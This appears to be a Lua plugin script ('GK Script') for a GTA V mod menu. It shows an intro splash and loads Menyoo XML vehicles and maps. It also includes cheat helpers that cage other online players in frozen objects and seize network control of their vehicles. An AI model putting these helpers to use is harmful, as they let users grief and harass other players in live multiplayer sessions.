--------------------------------------------------- CREDITS ----------------------------------------------------------
--[[
GK Script
]]
----------------------------------------------------------------------------------------------------------------------

resources_dir = filesystem.resources_dir() .. '/GK lua/'
if not filesystem.is_dir(resources_dir) then
    util.toast("ALERT: resources dir is missing! Please make sure you installed GK lua properly.")
	
end
vehicles_dir = filesystem.resources_dir() .. '\\menyoo vehicles\\'
if not filesystem.is_dir(vehicles_dir) then
    filesystem.mkdir(vehicles_dir)
end

maps_dir = filesystem.resources_dir() .. '\\menyoo maps\\'
if not filesystem.is_dir(maps_dir) then
    filesystem.mkdir(maps_dir)
end
slaxdom = require("lib/slaxdom")
slaxml = require("lib/slaxml")
util.require_no_lag('natives-1640181023')
require "lib.GK"

logo = directx.create_texture(resources_dir .. 'startpic.png')

util.show_corner_help("~g~载入成功~s~ ‹ ~o~ " .. SCRIPT_FILENAME .. "\n~s~感谢使用GK LUA\n本脚本完全免费 ~p~:D")

function on_stp()
	util.show_corner_help("~r~脚本已关闭~s~ ‹ ~o~ " .. SCRIPT_FILENAME .. "\n~s~再次感谢 ~p~:)")
end
local notification = b_notifications.new()

notification.notify("hallo","welcome,GK SCRIPT:)")


cTime = util.current_time_millis

local function SETUP_SINGLE_LINE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SETUP_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(70.0)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(125.0)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("left")
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end

local function ADD_TEXT_TO_SINGLE_LINE(scaleform, text, font, colour)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "ADD_TEXT_TO_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(text)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(font)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(colour)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end

local function HIDE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "HIDE")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME("presents")
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.16)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end

if SCRIPT_MANUAL_START then
    logo_alpha = 0.2
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then 
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(logo, 0.14, 0.14, 0.5, 0.5, 0.5, 0.5, 0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 3 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end

function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end

local overlay_x = 0.0052
local overlay_y = 0.18519
local run = true
local x, y = directx.get_client_size()
local ratio = x/y
local size = 0.03
local boxMargin = size / 7
local overlay_x = 0.0400
local overlay_y = 0.1850
local key_text_color = newColor(1, 1, 1, 1)
local background_colour = newColor(0, 0, 0, 0.2)
local pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
local spaceBarLength = 3
local spaceBarSlim = 1
local altSpaceBar = 0


if SCRIPT_MANUAL_START then
	gShowingIntro = true
	local state = 0
	local sTime = cTime()

	AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "clown_die_wrapper", PLAYER.PLAYER_PED_ID(), "BARRY_02_SOUNDSET", true, 20)

util.create_tick_handler(function()	
		local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("OPENING_CREDITS")	
		while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
			util.yield()
		end
		
		HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
		if state == 0 then
			SETUP_SINGLE_LINE(scaleform)
			ADD_TEXT_TO_SINGLE_LINE(scaleform, "GK", "$font2", "HUD_COLOUR_BLUE")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, PLAYER.GET_PLAYER_NAME(players.user()), "$font5", "HUD_COLOUR_PINK")

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Pre_Screen_Stinger", PLAYER.PLAYER_PED_ID(), "DLC_HEISTS_FINALE_SCREEN_SOUNDS", true, 20)
			state = 1
			sTime = cTime()
		end

		if cTime() - sTime >= 4000 and state == 1 then
			HIDE(scaleform)
			state = 2
			sTime = cTime()
		end

		if cTime() - sTime >= 3000 and state == 2 then
			SETUP_SINGLE_LINE(scaleform)
			ADD_TEXT_TO_SINGLE_LINE(scaleform, "GK script", "$font2", "HUD_COLOUR_BLUE")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, 'v' .. gVersion, "$font5", "HUD_COLOUR_WHITE")
			
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.PLAYER_PED_ID(), "BARRY_01_SOUNDSET", true, 20)
			state = 3
			sTime = cTime()
		end

		if cTime() - sTime >= 4000 and state == 3 then
			HIDE(scaleform)
			state = 4
			sTime = cTime()
		end
		if cTime() - sTime >= 3000 and state == 4 then
			gShowingIntro = false
			return false
		end

		GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
		return true
	end)

end


gVersion = 14.5


local scaleform = require("GK")
local sf = scaleform("instructional_buttons")
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local stop_on_exit = true
local speed = 6
local vehflyt

local colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 201,
purple = 49, --, 21, 96
blue = 11
}



function show_custom_alert_until_enter(l1)
    poptime = os.time()
    while true do
        if PAD.IS_CONTROL_JUST_RELEASED(18, 18) then
            if os.time() - poptime > 0.1 then
                break
            end
        end
        native_invoker.begin_call()
        native_invoker.push_arg_string("ALERT")
        native_invoker.push_arg_string("JL_INVITE_ND")
        native_invoker.push_arg_int(2)
        native_invoker.push_arg_string("")
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_int(-1)
        -- line here
        native_invoker.push_arg_string(l1)
        -- optional second line here
        native_invoker.push_arg_int(0)
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(0)
        native_invoker.end_call("701919482C74B5AB")
        util.yield()
    end
end

function log(content)
    if verbose then
        util.log("[GKSCRIPT] " .. content)
    end
end

function do_label_preset(label, text)
    log("Setting up label present for label " .. label .. " with text " .. text)
    menu.trigger_commands("addlabel " .. label)
    local prep = "edit" .. string.gsub(label, "_", "") .. " " .. text
    menu.trigger_commands(prep)
end

function notification(message, color)
	HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)

	local picture = "CHAR_SOCIAL_CLUB"
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)

	title = "GK Script"
	if color == colors.red or color == colors.red then
		subtitle = "~u~Notification"
	elseif color == colors.black then
		subtitle = "~c~Notification"
	else
		subtitle = "~u~Notification"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 4, title, subtitle)

	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			util.yield()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

cages = {}  -- 1114264700 <- vending machine cage
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object1																			

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	
	if object1 == 0 or object2 ==0 then --if 'CREATE_OBJECT' fails to create one of those 
		notification("Something Went Wrong Creating Cages", colors.red)
	end
	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end

function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end
local function file_exists(path)
    local file = io.open(path, "rb")
    if file then file:close() end
    return file ~= nil
end

local function split_str(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end

local function nil_handler(val, default)
    if val == nil then
        val = default
    end
    return val
end

function request_anim_dict(dict)
    request_time = os.time()
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return
    end
    STREAMING.REQUEST_ANIM_DICT(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

local function to_boolean(text)
    if text == 'true' or text == "1" then
        return true
    end
    return false
end

local function log(content)
    if verbose then
        util.log("[SPOONER] " .. content)
    end
end

local function parse_xml(path)
    -- does this path even exist?
    if not file_exists(path) then
        util.toast("配对该文件不存在")
        return
    end
    -- break file into string
    local xml = io.open(path):read('*all')
    -- dom that shit ;)
    local dom = slaxdom:dom(xml, {stripWhitespace=true})
    -- return our dominant superior ;)
    return dom
end

local function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end

local function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

function menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
    local ped_data = {}
    isped = true
    entity = ped
    menyoo_preprocess_entity(ped, att_data)
    if #entity_initial_handles > 0 then
        entity_initial_handles[att_data['InitialHandle']] = ped
    end
    for a,b in pairs(att_data['PedProperties'].kids) do
        local name = b.name
        local val = get_element_text(b)
        if name == 'PedProps' or name == 'PedComps' or name == 'TaskSequence' then
            ped_data[name] = b 
        else
            ped_data[name] = val
        end
    end
    local task_data = {}
    if att_data['TaskSequence'] ~= nil then
        for a,b in pairs(att_data['TaskSequence'].kids) do
            for c,d in pairs(b.kids) do
                task_data[d.name] = get_element_text(d)
            end
        end
    end
    local props = menyoo_build_properties_table(ped_data['PedProps'].kids)
    for k,v in pairs(props) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_PROP_INDEX(ped, k, tonumber(v[1]), tonumber(v[2]), true)
    end
    local comps = menyoo_build_properties_table(ped_data['PedComps'].kids)
    for k,v in pairs(comps) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_COMPONENT_VARIATION(ped, k, tonumber(v[1]), tonumber(v[2]), tonumber(v[2]))
    end
    PED.SET_PED_CAN_RAGDOLL(ped, to_boolean(ped_data['CanRagdoll']))
    PED.SET_PED_ARMOUR(ped, ped_data['Armour'])
    WEAPON.GIVE_WEAPON_TO_PED(ped, ped_data['CurrentWeapon'], 999, false, true)
    -- skipping over relationship groups, fuck that shit, seriously
    -- anim shit
    if task_data['AnimDict'] ~= nil then
        request_anim_dict(task_data['AnimDict'])
        local duration = tonumber(task_data['Duration'])
        local flag = tonumber(task_data['Flag'])
        local speed = tonumber(task_data['Speed'])
        TASK.TASK_PLAY_ANIM(ped, task_data['AnimDict'], task_data['AnimName'], 8.0, 8.0, duration, flag, speed, false, false, false)
    elseif ped_data['AnimDict'] ~= nil then
        request_anim_dict(ped_data['AnimDict'])
        TASK.TASK_PLAY_ANIM(ped, ped_data['AnimDict'], ped_data['AnimName'], 8.0, 8.0, -1, 1, 1.0, false, false, false)
    end
end

function menyoo_preprocess_entity(entity, data)
    data['Dynamic'] = nil_handler(data['Dynamic'], true)
    data['FrozenPos'] = nil_handler(data['FrozenPos'], true)
    data['OpacityLevel'] = nil_handler(data['OpacityLevel'], 255)
    data['IsInvincible'] = nil_handler(data['IsInvincible'], false)
    data['IsVisible'] = nil_handler(data['IsVisible'], true)
    data['HasGravity'] = nil_handler(data['HasGravity'], false)
    data['IsBulletProof'] = nil_handler(data['IsBulletProof'], false)
    data['IsFireProof'] = nil_handler(data['IsFireProof'], false)
    data['IsExplosionProof'] = nil_handler(data['IsExplosionProof'], false)
    data['IsMeleeProof'] = nil_handler(data['IsMeleeProof'], false)
    ENTITY.FREEZE_ENTITY_POSITION(entity, to_boolean(data['FrozenPos']))
    ENTITY.SET_ENTITY_ALPHA(entity, tonumber(data['OpacityLevel']), false)
    ENTITY.SET_ENTITY_INVINCIBLE(entity, to_boolean(data['IsInvincible']))
    ENTITY.SET_ENTITY_VISIBLE(entity, to_boolean(data['IsVisible']), 0)
    ENTITY.SET_ENTITY_HAS_GRAVITY(entity, to_boolean(data['HasGravity']))
    ENTITY.SET_ENTITY_PROOFS(entity, to_boolean(data['IsBulletProof']), to_boolean(data['IsFireProof']), to_boolean(data['IsExplosionProof']), false, to_boolean(data['IsMeleeProof']), false, true, false)
end

function menyoo_preprocess_car(vehicle, data)
    log("Preprocessing vehicle " .. vehicle)
    local colors = menyoo_build_properties_table(data['Colours'].kids)
    local neons = menyoo_build_properties_table(data['Neons'].kids)
    local doorsopen = menyoo_build_properties_table(data['DoorsOpen'].kids)
    local doorsbroken = menyoo_build_properties_table(data['DoorsBroken'].kids)
    if data['TyresBursted'] ~= nil then
        local tyresbursted = menyoo_build_properties_table(data['TyresBursted'].kids)
        for k,v in pairs(tyresbursted) do
            -- fucking menyoo.. here they go mixing up wheel indexes with strings
            k = k:gsub('_', '')
            local cure_menyoo_aids = {['FrontLeft'] = 0, ['FrontRight'] = 1, [2] = 2, [3] = 3, ['BackLeft'] = 4, ['BackRight'] = 5, [6]=6, [7]=7, [8]=8}
            VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, cure_menyoo_aids[k], false, 0.0)
        end
    end
    local mods = menyoo_build_properties_table(data['Mods'].kids)
    
    for k,v in pairs(neons) do
        local comp = {['Left']=0, ['Right']=1, ['Front']=2, ['Back']=3}
        VEHICLE._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, comp[k], to_boolean(v))
    end

    VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, tonumber(data['WheelType']))
    for k,v in pairs(mods) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        VEHICLE.SET_VEHICLE_MOD(vehicle, tonumber(k), tonumber(v[1]), to_boolean(v[2]))
    end

    for k,v in pairs(colors) do
        colors[k] = tonumber(v)
    end

    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors['Primary'], colors['Secondary'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors['Pearl'], colors['Rim'])
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colors['tyreSmoke_R'], colors['tyreSmoke_G'], colors['tyreSmoke_B'])
    VEHICLE._SET_VEHICLE_INTERIOR_COLOR(vehicle, colors['LrInterior'])
    VEHICLE._SET_VEHICLE_DASHBOARD_COLOR(vehicle, colors['LrDashboard'])
    local livery = tonumber(data['Livery'])
    if livery == -1 then
        livery = 0
    end
    VEHICLE.SET_VEHICLE_LIVERY(vehicle, livery)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, data['NumberPlateText'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, tonumber(data['NumberPlateTextIndex']))
    -- wheel invis here
    -- engine sound name here
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, tonumber(data['WindowTint']))
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, to_boolean(data['BulletProofTyres']))
    VEHICLE. SET_VEHICLE_DIRT_LEVEL(vehicle, tonumber(data['DirtLevel']))
    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, tonumber(data['PaintFade']))
    VEHICLE.SET_CONVERTIBLE_ROOF_LATCH_STATE(vehicle, tonumber(data['RoofState']))
    VEHICLE.SET_VEHICLE_SIREN(vehicle, to_boolean(data['SirenActive']))
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, to_boolean(data['EngineOn']), true, false)
    -- not sure how to set lights on
    AUDIO.SET_VEHICLE_RADIO_LOUD(vehicle, to_boolean(data['IsRadioLoud']))
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, tonumber(data['LockStatus']))
    if data['EngineHealth'] ~= nil then
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, tonumber(data['EngineHealth']))
    end
    log("Preprocessing complete for vehicle " .. vehicle)
end

function menyoo_build_properties_table(kids)
    log("Building a menyoo properties table...")
    if kids ~= nil then
        local table = {}
        for k,v in pairs(kids) do
            local name = v.name
            local val = get_element_text(v)
            table[name] = val
        end
        return table
    end
    return nil
end

local function menyoo_load_map(path)
    local all_entities = {}
    util.toast("您的地图正在加载。这可能需要一些时间.")
    log("Loading a map from " .. path)
    local entity_initial_handles = {}
    local xml_tbl = parse_xml(path).root
    -- n appears to be the enum of the kid, k is the actual kid table
    local data = {}
    for a,b in pairs(xml_tbl.kids) do
        local vproperties = {}
        local pproperties = {}
        local name = b.name
        local isvehicle = false
        local isped = false
        if name == 'ReferenceCoords' then
            for k,v in pairs(b.kids) do
                if v.name == 'X' then
                    mmblip_x = tonumber(get_element_text(v))
                elseif v.name == 'Y' then
                    mmblip_y = tonumber(get_element_text(v))
                elseif v.name == 'Z' then
                    mmblip_z = tonumber(get_element_text(v))
                end
            end
            mmblip = HUD.ADD_BLIP_FOR_COORD(mmblip_x, mmblip_y, mmblip_z)
            HUD.SET_BLIP_SPRITE(mmblip, 77)
            HUD.SET_BLIP_COLOUR(mmblip, 48)
        end
        if name == 'Placement' then
            for c,d in pairs(b.kids) do
                log(d.name)
                if d.name == 'PositionRotation' then
                    for e, f in pairs(d.kids) do
                        data[f.name] = get_element_text(f)
                    end
                elseif d.name == 'VehicleProperties' then
                    log("vprope")
                    isvehicle = true
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                elseif d.name == 'PedProperties' then
                    isped = true
                    pproperties[d.name] = d
                else
                    data[d.name] = get_element_text(d)
                end
                log("done")
            end
            mmpos = {}
            mmpos.x = tonumber(data['X'])
            mmpos.y = tonumber(data['Y'])
            mmpos.z = tonumber(data['Z'])
            mmrot = {}
            mmrot.pi = tonumber(data['Pitch'])
            mmrot.ro = tonumber(data['Roll'])
            mmrot.ya = tonumber(data['Yaw'])
            if STREAMING.IS_MODEL_VALID(data['ModelHash']) then
                local mment = 0
                if isvehicle then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_vehicle(data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_entity(mment, data)
                    menyoo_preprocess_car(mment, vproperties)
                elseif isped then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_ped(0, data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_ped(mment, pproperties, {})
                    menyoo_preprocess_entity(mment, data)
                else
                    request_model_load(data['ModelHash'])
                    mment = entities.create_object(data['ModelHash'], mmpos)
                    menyoo_preprocess_entity(mment, data)
                end
                table.insert(all_entities, mment)
                ENTITY.SET_ENTITY_ROTATION(mment, mmrot.pi, mmrot.ro, mmrot.ya, 2, true)
            else
                util.toast("发现一些无效模型。确保您没有使用需要模组的 XML.")
            end
        end
    end
    mm_maproot = menu.list(menyoomloaded_root, path:gsub(maps_dir, "") .. ' [' .. mmblip .. ']', {"menyooloadedmaps" .. mmblip}, "Maps you have loaded")
    menu.action(mm_maproot, "传送至地图", {"menyoomteleportto" .. mmblip}, "传送至地图.", function()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mmpos.x, mmpos.y, mmpos.z, false, false, false)
    end)

    menu.action(mm_maproot, "删除地图", {"menyoomdelete" .. mmblip}, "cease it to exist.", function()
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(mm_maproot)
        -- apparently remove blip is fucked, so we set sprite to invis as a failsafe
        HUD.SET_BLIP_ALPHA(mmblip, 0)
        --HUD.REMOVE_BLIP(mmblip)
    end)
    util.toast("地图加载完成。在地图上查找洋红色的 'L'.")
end

local function menyoo_load_vehicle(path, ped, doteleport, ours)
    log("Loading vehicle for ped " .. ped)
    local all_entities = {}
    if ours then
        log("This is ours")
        mvped = PLAYER.PLAYER_PED_ID()
    else
        log("This is theirs")
        mvped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(ped)
    end
    log("Loading a vehicle from " .. path)
    local entity_initial_handles = {}
    local data = {}
    local vproperties = {}
    local xml_tbl = parse_xml(path).root
    -- n appears to be the enum of the kid, k is the actual kid table
    for k,v in pairs(xml_tbl.kids) do
        local name = v.name
        if name == 'VehicleProperties' then
            for n, p in pairs(v.kids) do
                local prop_name = p.name
                if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                    vproperties[prop_name] = p
                else
                    vproperties[prop_name]  = get_element_text(p)
                end
            end
        else
            if name == 'SpoonerAttachments' then
                data[name] = v
            else
                local el_text = get_element_text(v)
                data[name] = el_text
            end
        end
    end
    request_model_load(data['ModelHash'])
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
    local vehicle = entities.create_vehicle(data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    table.insert(all_entities, vehicle)
    ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
    if doteleport then
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end
    if data['InitialHandle'] == nil then
        data['InitialHandle'] = math.random(10000, 30000)
    end
    entity_initial_handles[data['InitialHandle']] = vehicle
    -- apply natives that can apply to any entity
    menyoo_preprocess_entity(vehicle, data)
    menyoo_preprocess_car(vehicle, vproperties)
    -- vehicle-specific natives
    -- now for the attachments...
    local attachments = data['SpoonerAttachments']
    all_attachments = {}
    if attachments ~= nil then
        for a,b in pairs(attachments.kids) do
            local vproperties = {}
            -- each item here should be "attachment" element
            local att_data = {}
            for c,d in pairs(b.kids) do
                local name = d.name
                local val = get_element_text(d)
                if name == 'PedProperties' or name == 'Attachment' or name == 'TaskSequence' then
                    att_data[name] = d
                elseif name == 'VehicleProperties' then
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                else
                    att_data[name] = val
                end
            end
            request_model_load(att_data['ModelHash'])
            -- 1 = ped, 2 = vehicle, 3 = object
            local attachment_info = menyoo_build_properties_table(att_data['Attachment'].kids)
            local entity = nil
            local isped = false
            if att_data['Type'] == '1' then
                local ped = entities.create_ped(0, att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
                entity = ped
            elseif att_data['Type'] == '2' then
                local veh = entities.create_vehicle(att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                entity = veh
                menyoo_preprocess_entity(veh, att_data)
                menyoo_preprocess_car(veh, vproperties)
            elseif att_data['Type'] == '3' then
                local obj = entities.create_object(att_data['ModelHash'], coords)
                NETWORK.NETWORK_REGISTER_ENTITY_AS_NETWORKED(obj)
                local objID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(obj)
                NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(objID, true)
                entity = obj
                menyoo_preprocess_entity(obj, att_data)
                -- obj code
            end
            table.insert(all_entities, entity)
            ENTITY.SET_ENTITY_INVINCIBLE(entity, true)
            local bone = tonumber(attachment_info['BoneIndex'])
            local x = tonumber(attachment_info['X'])
            local y = tonumber(attachment_info['Y'])
            local z = tonumber(attachment_info['Z'])
            local pitch = tonumber(attachment_info['Pitch'])
            local yaw = tonumber(attachment_info['Yaw'])
            local roll = tonumber(attachment_info['Roll'])
            all_attachments[entity] = {}
            all_attachments[entity]['attachedto'] = attachment_info['AttachedTo']
            all_attachments[entity]['bone'] = bone
            all_attachments[entity]['x'] = x
            all_attachments[entity]['y'] = y
            all_attachments[entity]['z'] = z
            all_attachments[entity]['pitch'] = pitch
            all_attachments[entity]['yaw'] = yaw
            all_attachments[entity]['roll'] = roll
            all_attachments[entity]['isped'] = isped
        end
        for k, v in pairs(all_attachments) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(k, entity_initial_handles[v['attachedto']], v['bone'], v['x'], v['y'], v['z'], v['pitch'], v['roll'], v['yaw'], true, false, true, v['isped'], 2, true)
        end
    end
    log("Vehicle has been loaded.")
    local this_blip = HUD.ADD_BLIP_FOR_ENTITY(vehicle)
    HUD.SET_BLIP_SPRITE(this_blip, 77)
    HUD.SET_BLIP_COLOUR(this_blip, 47)
    local this_veh_root = menu.list(menyoovloaded_root, vehicle .. " [" .. VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(ENTITY.GET_ENTITY_MODEL(vehicle)) .. "]", {"menyoov" .. vehicle}, "")
